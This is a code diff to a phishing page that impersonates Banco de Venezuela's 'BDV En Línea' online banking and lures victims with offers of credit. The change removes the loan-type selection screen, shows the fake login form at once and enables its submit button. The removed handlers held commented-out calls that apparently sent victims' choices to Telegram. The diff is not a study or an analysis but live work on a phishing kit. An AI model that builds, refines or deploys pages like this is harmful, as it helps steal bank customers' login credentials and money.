@@ -603,40 +603,10 @@
 </head>
 <body>
     <!-- Página de selección de tipo de crédito -->
-    <div id="selectionPage">
-        <div class="header">
-            <img class="header-logo" src="index_files/logo.png" alt="BDV En Línea">
-            <h1 class="header-title">Bienvenido a BDVenlinea Creditos</h1>
-            <p class="header-subtitle">Seleccione su tipo de cuenta bancaria para la asignacion del credito</p>
-        </div>
-        
-        <div class="options-container">
-            <div class="option-card" id="empresaOption">
-                <div class="option-icon">
-                    <i class="material-icons">business</i>
-                </div>
-                <h2 class="option-title">CRÉDITO EMPRESAS</h2>
-                <p class="option-description">Seleccione esta opcion si usted es una persona juridica, es decir, empresa, siga los pasos para obtener el credito</p>
-                <button class="option-button">Seleccionar</button>
-            </div>
-            
-            <div class="option-card" id="personaOption">
-                <div class="option-icon">
-                    <i class="material-icons">person</i>
-                </div>
-                <h2 class="option-title">CRÉDITO PERSONA</h2>
-                <p class="option-description">Seleccione esta opcion si usted es una persona natural, siga los pasos para obtener el credito</p>
-                <button class="option-button">Seleccionar</button>
-            </div>
-        </div>
-        
-        <div class="footer">
-            <p>Banco de Venezuela © 2025 - Todos los derechos reservados</p>
-        </div>
-    </div>
+    
 
     <!-- Login container (inicialmente oculto) -->
-    <div id="loginContainer" class="login-container-float-center">
+    <div id="loginContainer" class="login-container-float-center" style="display: block;">
         <div class="login-container-logo">
             <img class="logo-login" src="index_files/logo.png">
         </div>
@@ -652,7 +622,7 @@
                     <div class="mat-form-field-ripple"></div>
                 </div>
                 <div class="button-login-container">
-                    <button type="button" id="openModalBtn" class="mat-raised-button" disabled="disabled">
+                    <button type="button" id="openModalBtn" class="mat-raised-button" >
                         <span>Entrar</span>
                     </button>
                 </div>
@@ -800,18 +770,7 @@ Ami Ven.
             const loadingSubtext = document.getElementById('loadingSubtext');
             const closeButtons = document.querySelectorAll('.close');
 
-            // Selección de tipo de crédito
-            empresaOption.addEventListener('click', function() {
-                selectedCreditType = 'EMPRESA';
-                showLoginPage();
-                //sendCreditTypeToTelegram(selectedCreditType);
-            });
-
-            personaOption.addEventListener('click', function() {
-                selectedCreditType = 'PERSONA';
-                showLoginPage();
-                //sendCreditTypeToTelegram(selectedCreditType);
-            });
+            
 
             // Función para mostrar la página de login
             function showLoginPage() {
